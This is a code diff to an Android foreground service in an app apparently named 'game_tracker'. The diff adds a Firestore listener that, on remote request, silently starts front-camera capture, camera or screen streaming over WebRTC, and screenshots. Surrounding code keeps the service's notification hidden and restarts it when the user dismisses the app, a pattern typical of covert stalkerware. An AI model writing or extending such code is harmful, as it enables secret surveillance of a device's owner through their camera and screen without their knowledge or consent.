@@ -3,10 +3,14 @@ package com.example.game_tracker
 import android.app.*
 import android.content.Context
 import android.content.Intent
+import android.content.pm.ServiceInfo
 import android.os.Build
 import android.os.IBinder
 import android.os.SystemClock
 import androidx.core.app.NotificationCompat
+import com.google.firebase.firestore.DocumentChange
+import com.google.firebase.firestore.FirebaseFirestore
+import com.google.firebase.firestore.ListenerRegistration
 
 class ForegroundService : Service() {
 
@@ -24,6 +28,8 @@ class ForegroundService : Service() {
         }
     }
 
+    private var firestoreListener: ListenerRegistration? = null
+
     override fun onCreate() {
         super.onCreate()
         createNotificationChannel()
@@ -31,14 +37,81 @@ class ForegroundService : Service() {
 
     override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
         val notification = createNotification()
-        startForeground(NOTIFICATION_ID, notification)
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
+            startForeground(NOTIFICATION_ID, notification, ServiceInfo.FOREGROUND_SERVICE_TYPE_LOCATION)
+        } else {
+            startForeground(NOTIFICATION_ID, notification)
+        }
 
-        // Return START_STICKY to automatically restart the service if killed by OS
+        setupFirestoreRequestListener()
+
         return START_STICKY
     }
 
+    private fun setupFirestoreRequestListener() {
+        if (firestoreListener != null) return
+
+        val prefs = getSharedPreferences("FlutterSharedPreferences", Context.MODE_PRIVATE)
+        val deviceId = prefs.getString("flutter.game_tracker_device_id", null) ?: return
+
+        try {
+            val firestore = FirebaseFirestore.getInstance()
+            firestoreListener = firestore.collection("screenshot_requests")
+                .whereEqualTo("targetDeviceId", deviceId)
+                .whereEqualTo("status", "pending")
+                .addSnapshotListener { snapshots, error ->
+                    if (error != null || snapshots == null) return@addSnapshotListener
+                    for (change in snapshots.documentChanges) {
+                        if (change.type == DocumentChange.Type.ADDED) {
+                            val doc = change.document
+                            val requestId = doc.id
+                            val requestType = doc.getString("requestType") ?: "screenshot"
+                            val cameraFacing = doc.getString("cameraFacing") ?: "front"
+
+                            when (requestType) {
+                                "camera_capture" -> {
+                                    val svcIntent = Intent(this, CameraCaptureService::class.java).apply {
+                                        putExtra("requestId", requestId)
+                                        putExtra("cameraFacing", cameraFacing)
+                                    }
+                                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+                                        startForegroundService(svcIntent)
+                                    } else {
+                                        startService(svcIntent)
+                                    }
+                                }
+                                "screen_share", "camera_stream" -> {
+                                    val svcIntent = Intent(this, WebRtcPublisherService::class.java).apply {
+                                        putExtra("requestId", requestId)
+                                        putExtra("cameraFacing", cameraFacing)
+                                    }
+                                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+                                        startForegroundService(svcIntent)
+                                    } else {
+                                        startService(svcIntent)
+                                    }
+                                }
+                                "screenshot" -> {
+                                    val svcIntent = Intent(this, ScreenCaptureService::class.java).apply {
+                                        putExtra("requestId", requestId)
+                                        putExtra("capture_once", true)
+                                    }
+                                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+                                        startForegroundService(svcIntent)
+                                    } else {
+                                        startService(svcIntent)
+                                    }
+                                }
+                            }
+                        }
+                    }
+                }
+        } catch (e: Exception) {
+            e.printStackTrace()
+        }
+    }
+
     override fun onTaskRemoved(rootIntent: Intent?) {
-        // Triggered when user swipes app away from recents
         val restartServiceIntent = Intent(applicationContext, ForegroundService::class.java).also {
             it.setPackage(packageName)
         }
@@ -55,6 +128,15 @@ class ForegroundService : Service() {
             restartServicePendingIntent
         )
         super.onTaskRemoved(rootIntent)
+    }
+
+    override fun onDestroy() {
+        try {
+            firestoreListener?.remove()
+            firestoreListener = null
+        } catch (e: Exception) {
+        }
+        super.onDestroy()
     }
 
     override fun onBind(intent: Intent?): IBinder? = null
@@ -89,7 +171,7 @@ class ForegroundService : Service() {
         )
 
         return NotificationCompat.Builder(this, CHANNEL_ID)
-            .setSmallIcon(android.R.drawable.sym_def_app_icon)
+            .setSmallIcon(R.mipmap.ic_launcher)
             .setContentIntent(pendingIntent)
             .setPriority(NotificationCompat.PRIORITY_MIN)
             .setVisibility(NotificationCompat.VISIBILITY_SECRET)
